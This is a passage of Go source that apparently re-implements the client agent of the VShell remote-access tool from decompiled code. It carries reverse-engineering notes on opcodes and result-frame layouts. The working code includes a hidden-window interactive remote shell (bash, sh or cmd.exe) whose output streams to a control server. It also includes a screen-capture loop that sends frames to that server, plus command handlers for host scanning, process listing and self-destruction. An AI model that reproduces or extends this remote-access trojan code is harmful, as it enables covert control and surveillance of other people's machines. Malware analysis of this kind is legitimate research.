//      "auto_vacuum"），与 SQLite 的 sqlite3Pragma 数组逐项吻合——该表来自
//      内嵌 SQLite（modernc.org/sqlite），与 VShell 命令无关；
//   3) 表内 0 个重定位（67 项 ×24B 区间 [0x1e302680,0x1e302cc8) 里没有任何
//      .reloc 条目），所以「3 字节字段是已重定位的实指针」不成立；
//   4) 解码后的池里没有 ifconfig/whoami/screenshot/socks5 等 VShell 字串。
// 结论：命令名字串**不在这张表里**，其所在表尚未定位（见「操作码表」上方复核
// 说明与 c2engine/string_decrypt.go 的排除清单）。此前把该表当成「偏移指向混淆
// 池、进而可解出每个操作码常量」的推断已作废，不要据此再试。
// The mnemonics below are descriptive labels for the branch behaviour, not
// recovered literals. On DAT_1e302680: it is NOT a command-name table. It is
// rewritten at load (0x117b989: pool-base + imm32 per record), its pool decodes
// as SQLite's pragma-name array (plaintext = dst - src over 0x9aff bytes, see
// c2engine/string_decrypt.go), it contains zero relocations, and the decoded pool
// holds no VShell strings. The per-opcode constants live in a different,
// table stays unresolved. Do not retry the "3-byte offset into the obfuscated
// pool" theory.
// ============================================================================

const (
	opCmdInterval    = 0x01 // interval get/set（dec case 0x0）
	opCmdScreenshot  = 0x02 // 截图/帧记录（dec case 0x1）
	opCmdSleepMode   = 0x03 // sleep mode（dec case 0x2）
	opCmdDebugLog    = 0x04 // debug-log/日志标志位（dec case 0x3）
	opCmdDefKeepAlvA = 0x05 // default 分支：keep-alive 秒数（dec default）
	opCmdNetCheck    = 0x06 // +0x74 读写（dec case 0x5）
	opCmdTunnelLog   = 0x07 // 日志级别（dec case 0x6）
	opCmdTunnelDump  = 0x08 // tunnel 信息落盘开关（dec case 0x7）
	opCmdConnStat    = 0x09 // 连接状态链表（dec case 0x8）
	opCmdSysList     = 0x0a // 系统列表 dump（dec case 0x9）
	opCmdSetGateway  = 0x0b // 网关/前置地址（dec case 0xa）
	opCmdPortMapDump = 0x0c // 端口映射 dump（dec case 0xb）
	opCmdSetSendDly  = 0x0d // 发送延迟（dec case 0xc）
	opCmdSetWorkMode = 0x0e // 工作模式（dec case 0xd）
	opCmdConnDump    = 0x0f // 连接 dump（dec case 0xe）
	opCmdPipeDump    = 0x10 // 管道/代理 dump（dec case 0xf）
	opCmdPingIntv    = 0x11 // ping 间隔（dec case 0x10）
	opCmdTcpPing     = 0x12 // tcp ping 次数（dec case 0x11）
	opCmdIfList      = 0x13 // 接口列表（dec case 0x12）
	opCmdIfDetail    = 0x14 // 接口详情（dec case 0x13）
	opCmdProxyList   = 0x15 // 代理列表 dump（dec case 0x14）
	opCmdSysList2    = 0x16 // 系统列表 dump 第二分支（dec case 0x15）
	opCmdNetRoute    = 0x17 // 路由/接口选择（dec case 0x16）
	opCmdMtu         = 0x18 // MTU（dec case 0x17）
	opCmdDefKeepAlvB = 0x19 // default 分支：keep-alive 秒数（dec default）
	opCmdSysTime     = 0x1a // 系统时间（dec case 0x19）
	opCmdPing        = 0x1b // ping 往返毫秒（dec case 0x1a）
	opCmdReconnect   = 0x1c // 重连（dec case 0x1b）
	opCmdHostScan    = 0x1d // 主机扫描（dec case 0x1c）
	opCmdUploadSpeed = 0x1e // 上传限速（dec case 0x1d）
	opCmdPingIntv2   = 0x1f // 读 [local_2a0[1]+8]+0x34（dec case 0x1e）
	opCmdFileList    = 0x20 // 0x43 项命令名表（dec case 0x1f）
	opCmdClientLimit = 0x21 // 许可/客户端上限（dec case 0x20）
	opCmdRelicense   = 0x22 // 重载 license（dec case 0x21）
	opCmdDestroy     = 0x23 // 销毁/退出（dec case 0x22）
	opCmdTunnelCount = 0x24 // tunnel 数量（dec case 0x23）
	opCmdProcList    = 0x25 // 进程列表（dec case 0x24）
	opCmdSvcList     = 0x26 // 服务列表（dec case 0x25）
	opCmdSysInfo     = 0x27 // 系统信息（dec case 0x26）
	opCmdSetDomain   = 0x28 // 域名/SNI（dec case 0x27）
	opCmdKeepAlive   = 0x29 // keep-alive（dec case 0x28）
	opCmdThreadCount = 0x2a // 线程数（dec case 0x29）
	opCmdFwdPort     = 0x2b // 转发端口（dec case 0x2a）
)

// resultFrameOps 记录原版结果帧的分发点：
//
//	FUN_0100d160（push 一条固定记录：op, a, b, c）
//	FUN_0100d440（按格式串 's'/'i' 把参数编码成 0x4b/0x75/0x47 记录，末尾补 0x54）
//	FUN_0100d5e0（先 push 记录再挂 load，供 FUN_0100eac0 填充）
//
// agentState 保存原版客户端对象中被这些 opcode 读写的运行时字段。
// agentState holds the runtime fields these opcodes read/write on the original
// client object (offsets in FUN_010952e0: +0x60 interval, +0x64 sleep mode,
// +0x69/+0x6a work mode, +0x74 upload speed, +0x304 keep-alive).
var (
	agentSleepMode    int  // 原版 local_280+0x60 / +0x66 对应的休眠模式（dec case 0x2）
	agentWorkMode     int  // 原版 (int)local_280+0x6a 工作模式（FUN_010943e0，dec case 0xd）
	agentPingInterval int  // 原版 [local_2a0[1]+8]+0x34（dec case 0x1e）
	agentKeepAlive    int  // 原版 local_280+0x304（dec default，经 FUN_010fdec0）
	agentClientLimit  = -1 // 原版 dec case 0x20：-1 = 未设置
	agentSendDelay    int  // 原版 (int)local_280+0x74：发送延迟/上传限速（dec case 0xc / 0x1d）
	agentDebugMask    int  // 原版 local_280[6] 的调试/日志标志位（dec case 0x3）
	// agentSendField 对应 dec case 0x5 读写的 [local_2a0[3]+0x74]：local_2a0[3]
	// 是「当前命令记录」里的一个 4 字节字段（record+0xc），+0x74 是该字段所指
	// 对象的偏移 —— 与 agentSendDelay 的 (int)local_280+0x74 不是同一个字段。
	agentSendField int
	// agentTunnelLogLevel 对应 dec case 0x6 写入的 local_398+0x224。
	agentTunnelLogLevel int
	agentReconnect      int // 原版 local_398+0x228（dec case 0x1b）
	agentThreadCount    int // 原版 +0x300（dec case 0x29，FUN_010ff7e0）
	// agentTunnelDumpState 对应 dec case 0x7 落盘的那个布尔（FUN_010836e0）。
	agentTunnelDumpState int
	agentSysTimeSet      bool // 原版 dec case 0x19 的「系统时间已设置」标志
	// agentTunnelCount 对应 dec case 0x23 读写的 local_2a0 记录 +2 字节。
	agentTunnelCount int
	// agentDomain 对应 dec case 0x27 的全局 DAT_1e490960（域名/SNI）。
	agentDomain string
	// agentGateway 对应 dec case 0xa 的全局 DAT_1e490968（前置/网关地址）。
	agentGateway string
	// agentSysInfoMode 对应 dec case 0x26 的 local_280+0x66 字节。
	agentSysInfoMode int
)

// parseSysInfoMode 复刻 FUN_01094600（dec case 0x26 的解析器）。
// 反编译（FUN_01094600）：首字节 '0'/'1'/'2'（0x30–0x32）直接返回该数字；
// 否则依次与两个运行期写入的字符串比较，前者相等回 1、后者相等回 2，都不等回 0。
// 那两个字符串在静态镜像里是空的（见文件上方 CAVEAT），因此这里只实现可证的
// 数字形态；文本形态按「都不匹配」处理（返回 0），不臆造匹配串。
func parseSysInfoMode(argv []byte) int {
	if len(argv) < 2 {
		return 0
	}
	c := argv[1]
	if c >= '0' && c <= '2' {
		return int(c - '0')
	}
	return 0
}

// ============================================================================
// Result frames — FUN_0100d160 / FUN_0100d440 / FUN_0100d5e0 / FUN_01094a20
// 结果帧编码
//
// 原版把结果写成 24 字节的「类型化字段记录」序列（在线路上由 c2engine/wire.go
// 的 AgentField 描述），不是文本。三条写入路径的反编译：
//
//	FUN_0100d160(ctx, buf, kind, A, B, C)          // 追加一条记录
//	  +0x90 计数；+0x94 容量，满了走 FUN_0100d0a0 扩容
//	  rec+0x00 = kind    rec+0x01 = 0     rec+0x02 = 0 (u16)
//	  rec+0x04 = A       rec+0x08 = B     rec+0x0c = C     rec+0x10 = 0 (u64)
//	  返回写入前的计数（= 该记录的序号）
//
//	FUN_0100d440(ctx, buf, base, format, argv)     // 按格式串编码一条「条目」
//	  逐字符扫描 format：'\0' 收尾；'s' 取一个字符串指针；'i' 取一个整数。
//	  's' → 值非空走 FUN_0100d5e0(0x75,...)，为空走 FUN_0100d5e0(0x4b,...)；
//	  'i' → FUN_0100d160(0x47, 值, base+pos, 0)
//	  收尾：FUN_0100d160(0x54, base, 已发记录数, 0)   ← 列表行终止记录
//
//	FUN_0100d5e0(...)  // 先 FUN_0100d160 建记录，再 FUN_0100eac0 把「负载」
//	                   // 挂到扩容出来的 8 字节缓冲上，由服务器侧回填
//
//	FUN_01094a20(ctx, buf, value)                  // 标量结果
//	  FUN_0100d8a0(ctx, buf, 0x48, 0, 1, 0, &value, -0xd)
//	    → FUN_0100d160(0x48, A=0, B=1, C=0) + 负载 value
//	  FUN_0100d160(0x54, A=1, B=1, C=0)            ← 终止记录
//
//	FUN_01094ba0(ctx, buf, str)                    // 单字符串结果
//	  str == 0 时什么都不发；否则 FUN_0100d5e0(0x75, 0, 1, 0, str, 0)
//	  + FUN_0100d160(0x54, 1, 1, 0)
//
// 这些 24 字节记录是原版结果通道的**内容**；它们怎样变成线路上的字节则
// 未恢复（见下方「Result frames on the wire」一节）。原版的字符串负载由
// FUN_0100eac0 以「8 字节指针单元」的形式挂进记录的 +0x10（再经 FUN_0100e940
// → FUN_00fb9800 复制字符串、flags+0x01 写 0xfa），即进程内表示，不是可传输
// 的封包。因此复刻端不构造该封包，传输层仍发 ResultRequest JSON。
// ============================================================================

// 结果帧码（上列各函数的字面量参数）。
const (
	frameKindListEnd = 0x54 // FUN_0100d440 / FUN_01094a20 / FUN_01094ba0 的终止记录
	frameKindDetail  = 0x75 // 's' 且字符串非空（FUN_0100d5e0）
	frameKindStrNil  = 0x4b // 's' 但字符串为空（FUN_0100d5e0）
	frameKindInt     = 0x47 // 格式串 'i'
	frameKindScalar  = 0x48 // FUN_01094a20 的标量记录
	frameKindAck     = 0xa6 // FUN_010952e0 dec case 0x3 末尾的 FUN_0100d240(0xa6)
	frameKindPong    = 0xb1 // FUN_010952e0 dec case 0x1a 的 'p' 变体
	frameKindPing    = 0xb2 // FUN_010952e0 dec case 0x1a 的一般情形
)

// ============================================================================
// Result frames on the wire — UNRECOVERED, do not assume an encoding
// 结果帧的线路形态：未恢复
//
// 记录本身是实锤（见下一节的 FUN_0100d160 布局），但「记录怎样变成线路上的
// 字节」在静态侧没有找到任何一个实现者——没有任何函数把缓冲区 +0x88/+0x90
// 取出来写 socket。已排除的候选链路：
//
//	FUN_015f9c60   泛型参数构造器（FUN_0040d240 取对象 + 逐字段写入），与记录缓冲无关
//	FUN_015f8480   实为 FUN_015f8320（反编译所标地址为该函数内部），做的是
//	               指针遍历 + 正则/分割，不碰记录缓冲
//	FUN_0102ec00 / FUN_01065280 / FUN_01010ac0 / FUN_01047600
//	               都只是往缓冲里产生记录再向下传，本身不序列化
//	FUN_010f3220   只解析请求并调用 FUN_010952e0，不发送
//	操作数扫描 +0x88 / +0x90 只命中用户结构体，没有池缓冲的读取者
//
// 已确证、下一次应从这些点接着查的事实：
//
//	FUN_0100cb40  引擎池分配 0x130 字节缓冲对象，清零 +0x44 起 0xa8 字节，
//	              挂链后立即发一条 0x08 记录（A=0,B=1,C=0）
//	FUN_0100cf60  以 24 字节为单位扩容，容量上限 0x2b*24 = 1032
//	FUN_0100e1a0  批量路径：把「每记录 4 字节」的压缩描述符数组展开成 24 字节记录
//	              —— 记录种类 1..4 是远端解析的紧凑指针，不是完整记录
//	FUN_0100eac0  负载不在记录里：它分配 8 字节单元（FUN_00ec0cc0），把该单元指针
//	              写进记录的 +0x10，并登记析构 FUN_0100eca0；字符串负载另走
//	              FUN_0100e940 → FUN_00fb9800（makestringcopy），flags+0x01 = 0xfa
//	              任务完成码集合（FUN_0100e600 分支）：-3,-11,-0x1e,-0x1f,-2,
//	              -0x11,-0x15,-0x16,-0x1a,-0x19
//	服务器侧消费端同样是「缓冲内」的：
//	              FUN_0100dec0 / FUN_0100dda0 把记录序号写进 cmd+0x50[index] 索引表；
//	              FUN_0100df40 发 0xa6(1,1,0)；FUN_0100dfa0 把 record[1] 的种类
//	              改写为 0xb8
//
// 因此复刻端**不构造**线路形态：SendResult 沿用既有的 ResultRequest JSON 信封
// （见各传输实现），这是一处已记录的偏差。任何「看起来像」的记录编码都是编造的
// ——指针与长度、负载内联与否都没有证据，两端自洽只能证明自洽，不能证明对齐。
// ============================================================================

// resultRecordBytes 把记录序列编码成连续 24 字节记录块（缓冲内布局）。
//
// 注意：这只复刻缓冲内部的排布（+0x88 起、每条 24 字节，计数器 +0x90），
// 它**不是**线上格式——照它发出去是没有依据的。目前没有生产调用者。
// resultRecordBytes serialises records into the contiguous 24-byte block held
// inside the original's output buffer. This is the IN-BUFFER layout, NOT a
// recovered wire format — nothing in the binary sends these bytes as-is.
func resultRecordBytes(frames []resultFrame) []byte {
	out := make([]byte, 0, len(frames)*24)
	for _, f := range frames {
		out = append(out, f.bytes()...)
	}
	return out
}

// resultFrame 是一条 24 字节记录（FUN_0100d160 写入的布局）。
type resultFrame struct {
	Kind  uint8  // +0x00
	Flags uint8  // +0x01（FUN_0100d160 恒写 0）
	W     uint16 // +0x02（恒写 0）
	A     uint32 // +0x04
	B     uint32 // +0x08
	C     uint32 // +0x0c
	D     uint64 // +0x10（FUN_0100d160 恒写 0）

	// Load / HasLoad 记录该帧挂在 FUN_0100eac0 负载缓冲上的值（字符串指针或
	// 整数），它不是记录字段本身，只在测试断言里出现。
	Load    int64
	IsPtr   bool
	HasLoad bool
}

// bytes 按 FUN_0100d160 的布局序列化一条记录。
func (f resultFrame) bytes() []byte {
	b := make([]byte, 24)
	b[0] = f.Kind
	b[1] = f.Flags
	binary.LittleEndian.PutUint16(b[2:], f.W)
	binary.LittleEndian.PutUint32(b[4:], f.A)
	binary.LittleEndian.PutUint32(b[8:], f.B)
	binary.LittleEndian.PutUint32(b[12:], f.C)
	binary.LittleEndian.PutUint64(b[16:], f.D)
	return b
}

// resultFrameSink 在每次原生操作码产生结果帧时被调用（测试用；nil = 丢弃）。
var resultFrameSink func(frames []resultFrame)

func emitFrames(frames []resultFrame) {
	if resultFrameSink != nil && len(frames) > 0 {
		resultFrameSink(frames)
	}
}

// emitScalar 复刻 FUN_01094a20：一条 0x48 记录 + 一条 0x54 终止记录。
func emitScalar(value int) []resultFrame {
	return []resultFrame{
		{Kind: frameKindScalar, A: 0, B: 1, C: 0, Load: int64(value), HasLoad: true},
		{Kind: frameKindListEnd, A: 1, B: 1, C: 0},
	}
}

// emitScalarFrames 复刻 FUN_01094a20 的下发动作：emitScalar + 投递。
func emitScalarFrames(value int) { emitFrames(emitScalar(value)) }

// emitStringFrames 复刻 FUN_01094ba0 的下发动作：emitString + 投递（空串不发）。
func emitStringFrames(s string) { emitFrames(emitString(s)) }

// emitString 复刻 FUN_01094ba0：空串不发任何记录。
func emitString(s string) []resultFrame {
	if s == "" {
		return nil
	}
	return []resultFrame{
		{Kind: frameKindDetail, A: 0, B: 1, C: 0, Load: 1, IsPtr: true, HasLoad: true},
		{Kind: frameKindListEnd, A: 1, B: 1, C: 0},
	}
}

// emitFormat 复刻 FUN_0100d440：format 每个 's' 消费一个字符串参数（用 args 的
// 非零表示非空串），每个 'i' 消费一个整数参数。
//
// 目前没有已实现的操作码走到这里：用到 0x44 编码的全是「列表 dump」分支
// （dec case 0x8/0xb/0xe/0xf/0x12/0x13/0x14/0x1f），它们都还依赖静态不可读的
// 运行期字段名表。保留它是为了把已证实的记录布局固定下来（并有测试钉住），
// 而不是让调用者以为这些分支已经可用。
func emitFormat(base uint32, format string, args ...int64) []resultFrame {
	var frames []resultFrame
	pos := uint32(0)
	ai := 0
	next := func() int64 {
		if ai < len(args) {
			v := args[ai]
			ai++
			return v
		}
		return 0
	}
	for _, c := range format {
		switch c {
		case 0:
			goto done
		case 's':
			v := next()
			if v != 0 {
				frames = append(frames, resultFrame{
					Kind: frameKindDetail, A: 0, B: base + pos, C: 0,
					Load: v, IsPtr: true, HasLoad: true,
				})
			} else {
				frames = append(frames, resultFrame{
					Kind: frameKindStrNil, A: 0, B: base + pos, C: 0,
					Load: 0, IsPtr: true, HasLoad: true,
				})
			}
		case 'i':
			frames = append(frames, resultFrame{
				Kind: frameKindInt, A: uint32(next()), B: base + pos, C: 0,
			})
		}
		pos++
	}
done:
	frames = append(frames, resultFrame{Kind: frameKindListEnd, A: base, B: pos, C: 0})
	return frames
}

// ============================================================================
// Interactive remote terminal session
// 交互式远程终端会话
//
// The web panel's terminal relays to the agent via these commands:
//   terminal_start type=<bash|sh|cmd> rows=N cols=M
//   terminal_input:<base64>   terminal_resize rows=N cols=M
//   terminal_close
// The agent spawns a shell, keeps it across tasks, and streams the shell's
// output back as "terminal_output:<base64>" results (the server relays those
// to the browser's terminal WebSocket live).
// ============================================================================

// agentTermSession 保存交互式终端会话状态。
// agentTermSession holds interactive terminal session state.
type agentTermSession struct {
	mu     sync.Mutex
	cmd    *exec.Cmd
	stdin  io.WriteCloser
	taskID int64
	active bool
	// waitOnce ensures cmd.Wait() is called exactly once per session (shell-exit
	// goroutine OR terminalClose). It is replaced on every startTerminal: a
	// sync.Once value would fire only once for the agent's whole lifetime and
	// break every terminal session after the first.
	waitOnce *sync.Once
}

var termSess agentTermSession

// submitTerminalOutput streams shell output to the server as a terminal_output
// result bound to the terminal's task ID (the server routes by client ID).
func submitTerminalOutput(taskID int64, data []byte) {
	if transport == nil {
		return
	}
	enc := base64.StdEncoding.EncodeToString(data)
	if err := transport.SendResult(taskID, "terminal_output:"+enc, "completed"); err != nil {
		log.Printf("Terminal output send failed: %v", err)
	}
}

func startTerminal(termType string, rows, cols int, taskID int64) (string, string) {
	termSess.mu.Lock()
	defer termSess.mu.Unlock()

	if termSess.active {
		// Replace any existing session: kill it, then reap it through the old
		// session's own once so we never double-Wait with the previous session's
		// exit goroutine (exec.Cmd.Wait must not be called concurrently).
		oldCmd := termSess.cmd
		oldOnce := termSess.waitOnce
		if oldCmd != nil && oldCmd.Process != nil {
			oldCmd.Process.Kill()
		}
		termSess.mu.Unlock()
		if oldOnce != nil {
			oldOnce.Do(func() { oldCmd.Wait() })
		}
		termSess.mu.Lock()
		termSess.active = false
	}

	shell := "/bin/bash"
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
	} else {
		switch termType {
		case "sh":
			shell = "/bin/sh"
		case "bash":
			shell = "/bin/bash"
		}
	}

	cmd := exec.Command(shell)
	hideCmdWindow(cmd)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return "", err.Error()
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return "", err.Error()
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return "", err.Error()
	}
	if err := cmd.Start(); err != nil {
		return "", err.Error()
	}

	termSess.cmd = cmd
	termSess.stdin = stdin
	termSess.taskID = taskID
	termSess.active = true
	// Fresh once per session: the shell-exit goroutine and terminalClose share
	// this pointer only, so a later session's once is never consumed here.
	once := &sync.Once{}
	termSess.waitOnce = once

	readLoop := func(r io.Reader) {
		buf := make([]byte, 4096)
		for {
			n, err := r.Read(buf)
			if n > 0 {
				// submitTerminalOutput base64-encodes synchronously before the
				// next Read reuses buf, so passing buf[:n] directly is safe.
				submitTerminalOutput(taskID, buf[:n])
			}
			if err != nil {
				return
			}
		}
	}
	go readLoop(stdout)
	go readLoop(stderr)

	// Detect shell self-exit (e.g. the user typed `exit`): mark the session
	// inactive so terminal_input stops writing to a dead pipe, and let the
	// readLoop goroutines wind down on EOF. waitOnce guards cmd.Wait() so this
	// never races terminalClose's own Wait.
	go func() {
		once.Do(func() { cmd.Wait() })
		termSess.mu.Lock()
		// Only tear down our own session; a stale exit goroutine must not kill
		// a replacement session that started after we exited.
		if termSess.cmd == cmd {
			termSess.active = false
		}
		termSess.mu.Unlock()
		log.Printf("Terminal (task %d) exited", taskID)
	}()

	log.Printf("Terminal started (%s), task %d", shell, taskID)
	return "terminal started", ""
}

func terminalInput(encoded string) (string, string) {
	// Copy the stdin reference under the lock, then write WITHOUT holding it:
	// a pipe write blocks once the shell's stdin buffer fills and the shell
	// isn't draining it, which would otherwise stall the whole agent (the task
	// loop is single-threaded).
	termSess.mu.Lock()
	if !termSess.active || termSess.stdin == nil {
		termSess.mu.Unlock()
		return "", "no active terminal"
	}
	stdin := termSess.stdin
	termSess.mu.Unlock()

	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", err.Error()
	}
	if _, err := stdin.Write(data); err != nil {
		return "", err.Error()
	}
	return "ok", ""
}

func terminalClose() (string, string) {
	termSess.mu.Lock()
	cmd := termSess.cmd
	once := termSess.waitOnce
	if termSess.active && cmd != nil && cmd.Process != nil {
		cmd.Process.Kill()
	}
	termSess.active = false
	termSess.mu.Unlock()

	// Reap the process outside the lock; the session's once prevents a race
	// with the shell-exit goroutine's own Wait.
	if cmd != nil && once != nil {
		once.Do(func() { cmd.Wait() })
	}
	return "terminal closed", ""
}

// ============================================================================
// Screen capture streaming
// 屏幕捕获流
//
//   screen_capture_start quality=N fps=M
//   screen_capture_stop      screen_capture_quality=N   screen_capture_fps=N
//
// Frames are streamed back as "screen_frame:<format>:<index>:<base64>"
// results; the server relays them (as binary) to the screen viewer WebSocket.
// ============================================================================

// agentScreenCapture 保存屏幕捕获流状态。
// agentScreenCapture holds screen capture streaming state.
type agentScreenCapture struct {
	mu     sync.Mutex
	stop   chan struct{}
	taskID int64
	index  int64
	active bool
	fps    int
	// quality is the viewer-selected clarity (the panel's 清晰度 radio, sent as
	// quality=N). It is emitted in the frame payload so the server can pick a
	// matching compression level for the viewer.
	quality int
}

var screenCap agentScreenCapture

func startScreenCapture(quality, fps int, taskID int64) (string, string) {
	screenCap.mu.Lock()
	if screenCap.active {
		// Stop the existing goroutine by closing the channel it captured.
		close(screenCap.stop)
	}
	stop := make(chan struct{})
	screenCap.stop = stop
	screenCap.taskID = taskID
	screenCap.index = 0
	screenCap.active = true
	screenCap.fps = fps
	screenCap.quality = quality
	if screenCap.fps <= 0 {
		screenCap.fps = 1
	}
	screenCap.mu.Unlock()

	go func() {
		for {
			// Re-read fps under the lock each tick so screen_capture_fps=N
			// takes effect on the running stream. `stop` is captured ONCE (this
			// goroutine's own channel), so replacing screenCap.stop on restart
			// cannot race or misroute this goroutine.
			screenCap.mu.Lock()
			f := screenCap.fps
			if f <= 0 {
				f = 1
			}
			screenCap.mu.Unlock()

			interval := time.Second / time.Duration(f)
			if interval < 50*time.Millisecond {
				interval = 50 * time.Millisecond
			}

			timer := time.NewTimer(interval)
			select {
			case <-timer.C:
				// captureScreenshot() already returns base64 — use it directly
				// instead of decode→re-encode churn.
				enc, errMsg := captureScreenshot()
				if enc == "" || errMsg != "" {
					continue
				}
				screenCap.mu.Lock()
				screenCap.index++
				idx := screenCap.index
				q := screenCap.quality
				screenCap.mu.Unlock()
				payload := "screen_frame:png:" + strconv.FormatInt(idx, 10) +
					":" + strconv.Itoa(q) + ":" + enc
				if transport != nil {
					if err := transport.SendResult(taskID, payload, "completed"); err != nil {
						log.Printf("Screen frame send failed: %v", err)
					}
				}
			case <-stop:
				timer.Stop()
				return
			}
		}
	}()

	log.Printf("Screen capture started (fps=%d), task %d", fps, taskID)
	return "screen capture started", ""
}

func stopScreenCapture() (string, string) {
	screenCap.mu.Lock()
	defer screenCap.mu.Unlock()
	if screenCap.active {
		close(screenCap.stop)
		screenCap.active = false
	}
	return "screen capture stopped", ""
}

func setScreenCaptureParam(kind string, value int) (string, string) {
	screenCap.mu.Lock()
	defer screenCap.mu.Unlock()
	switch kind {
	case "fps":
		screenCap.fps = value
	case "quality":
		// The capture tools always produce the same image; quality rides along
		// on each frame so the server can tune the viewer's compression.
		screenCap.quality = value
	}
	return "ok", ""
}

// dispatchTerminalCommand parses "terminal_*" relay commands.
func dispatchTerminalCommand(taskID int64, cmdStr string) (string, string) {
	switch {
	case strings.HasPrefix(cmdStr, "terminal_start"):
		typ := "cmd"
		rows, cols := 24, 80
		parseKV(cmdStr, func(k, v string) {
			switch k {
			case "type":
				typ = v
			case "rows":
				fmt.Sscanf(v, "%d", &rows)
			case "cols":
				fmt.Sscanf(v, "%d", &cols)
			}
		})
		return startTerminal(typ, rows, cols, taskID)
	case strings.HasPrefix(cmdStr, "terminal_input:"):
		return terminalInput(strings.TrimPrefix(cmdStr, "terminal_input:"))
	case strings.HasPrefix(cmdStr, "terminal_resize"):
		// Size hint only; pipe-backed shell ignores it.
		return "ok", ""
	case strings.HasPrefix(cmdStr, "terminal_close"):
		return terminalClose()
	}
	return "unknown terminal command", ""
}

// dispatchScreenCommand parses "screen_capture*" relay commands.
func dispatchScreenCommand(taskID int64, cmdStr string) (string, string) {
	switch {
	case strings.HasPrefix(cmdStr, "screen_capture_start"):
		quality, fps := 50, 5
		parseKV(cmdStr, func(k, v string) {
			switch k {
			case "quality":
				fmt.Sscanf(v, "%d", &quality)
			case "fps":
				fmt.Sscanf(v, "%d", &fps)
			}
		})
		return startScreenCapture(quality, fps, taskID)
	case strings.HasPrefix(cmdStr, "screen_capture_stop"):
		return stopScreenCapture()
	case strings.HasPrefix(cmdStr, "screen_capture_quality"):
		var q int
		fmt.Sscanf(strings.TrimPrefix(cmdStr, "screen_capture_quality="), "%d", &q)
		return setScreenCaptureParam("quality", q)
	case strings.HasPrefix(cmdStr, "screen_capture_fps"):
		var f int
		fmt.Sscanf(strings.TrimPrefix(cmdStr, "screen_capture_fps="), "%d", &f)
		return setScreenCaptureParam("fps", f)
	}
	return "unknown screen capture command", ""
}

// parseKV walks "key=value key2=value2 ..." tokens from a relay command.
func parseKV(s string, fn func(k, v string)) {
	fields := strings.Fields(s)
	for _, f := range fields {
		if kv := strings.SplitN(f, "=", 2); len(kv) == 2 {
			fn(kv[0], kv[1])
		}
	}
}

// nativeCommandNames 把操作码映射为原版的助记名（见文件上方 CAVEAT）。
// nativeCommandNames maps an opcode to its mnemonic (see the CAVEAT above).
var nativeCommandNames = map[byte]string{
	opCmdInterval:    "interval",
	opCmdScreenshot:  "screenshot",
	opCmdSleepMode:   "sleep",
	opCmdDebugLog:    "debuglog",
	opCmdDefKeepAlvA: "keepalive_default",
	opCmdNetCheck:    "sendstate",
	opCmdTunnelLog:   "tunnellog",
	opCmdTunnelDump:  "tunneldump",
	opCmdConnStat:    "connstat",
	opCmdSysList:     "syslist",
	opCmdSetGateway:  "gateway",
	opCmdPortMapDump: "portmap",
	opCmdSetSendDly:  "senddelay",
	opCmdSetWorkMode: "workmode",
	opCmdConnDump:    "connlist",
	opCmdPipeDump:    "pipelist",
	opCmdPingIntv:    "pinginterval",
	opCmdTcpPing:     "tcpping",
	opCmdIfList:      "iflist",
	opCmdIfDetail:    "ifdetail",
	opCmdProxyList:   "proxylist",
	opCmdSysList2:    "syslist2",
	opCmdNetRoute:    "netroute",
	opCmdMtu:         "mtu",
	opCmdDefKeepAlvB: "keepalive_default2",
	opCmdSysTime:     "systime",
	opCmdPing:        "ping",
	opCmdReconnect:   "reconnect",
	opCmdHostScan:    "hostscan",
	opCmdUploadSpeed: "uploadspeed",
	opCmdPingIntv2:   "pinginterval2",
	opCmdFileList:    "filelist",
	opCmdClientLimit: "clientlimit",
	opCmdRelicense:   "relicense",
	opCmdDestroy:     "destroy",
	opCmdTunnelCount: "tunnelcount",
	opCmdProcList:    "proclist",
	opCmdSvcList:     "svclist",
	opCmdSysInfo:     "sysinfo",
	opCmdSetDomain:   "domain",
	opCmdKeepAlive:   "keepalive",
	opCmdThreadCount: "threadcount",
	opCmdFwdPort:     "fwdport",
}

// dispatchNativeCommand 执行一条原生操作码任务。
// dispatchNativeCommand executes one native-opcode task.
//
// 反编译（FUN_010952e0）：跳转表 0x1dc31e40 以 (操作码 - 1) 为索引（见文件上方
// 操作码表的说明），每项对应一条「首字节 = 操作码，其后 4 字节大端参数」的命令块：
//
//	opcode = argv[0]
//	if len(argv) > 1 { arg = big-endian int32(argv[1:5]) }   // 原版 FUN_00fc1620
//
// 返回值 (result, errMsg) 沿用 executeCommand 的约定（errMsg 非空 = 失败）。
// 原版的结果不是字符串而是二进制帧（24 字节记录序列，见 c2engine/wire.go 与
// emitFrameInt/emitFrameString）；本函数返回的文本是这些帧内容的等值描述，
// 由调用方按 SendResult 送出。
func dispatchNativeCommand(taskID int64, op byte, argv []byte, timeout int) (string, string) {
	name := nativeCommandNames[op]
	if name == "" {
		name = "opcode " + strconv.Itoa(int(op))
	}
	arg := 0
	hasArg := len(argv) > 1
	if hasArg {
		arg = decodeCommandInt(argv)
	}

	switch op {
	case opCmdInterval:
		// 原版 dec case 0x0：无参数 → FUN_01094a20(下发当前 +0x60 间隔)；有参数 →
		// FUN_00fc1000 解析后写入 +0x60（屏蔽符号位）再下发。
		if hasArg {
			if arg < 0 {
				arg = -arg
			}
			if arg > 0 {
				sleepTime = arg
			}
		}
		emitFrames(emitScalar(sleepTime))
		return fmt.Sprintf("interval %d", sleepTime), ""

	case opCmdScreenshot:
		// 原版 dec case 0x1：FUN_0100fa40 标记该类任务正在处理，然后按
		// local_330[2]（该命令所属「任务类别」）分两种结果帧：
		//   local_330[2] == 1 且 local_280[6] 的 bit28 已置 → 记录种类 0xb8；
		//   否则用 FUN_0100e1a0 建记录，A/B 位写索引，C 位写该类别值，
		//   有文本参数时再经 FUN_00fc1620 解析后写入。
		// 复刻端已有的截图能力是面板文本中继（screen_capture_*），而本操作码
		// 的参数是「属于某一任务类别的命令记录」——类别编号用的是运行期才写入
		// 的命令名表，静态镜像里读不到。因此如实报告未实现。
		return "", "opcode 0x" + strconv.FormatInt(int64(op), 16) + " (" + name + ") not implemented"

	case opCmdSleepMode:
		// 原版 dec case 0x2：无参数 → FUN_00fee960 读、下发；有参数 →
		// FUN_010943e0 解析模式（1/2 有效）→ FUN_00fee860 写入。
		if hasArg {
			agentSleepMode = arg
		}
		emitFrames(emitScalar(agentSleepMode))
		return fmt.Sprintf("sleep mode %d", agentSleepMode), ""

	case opCmdDebugLog:
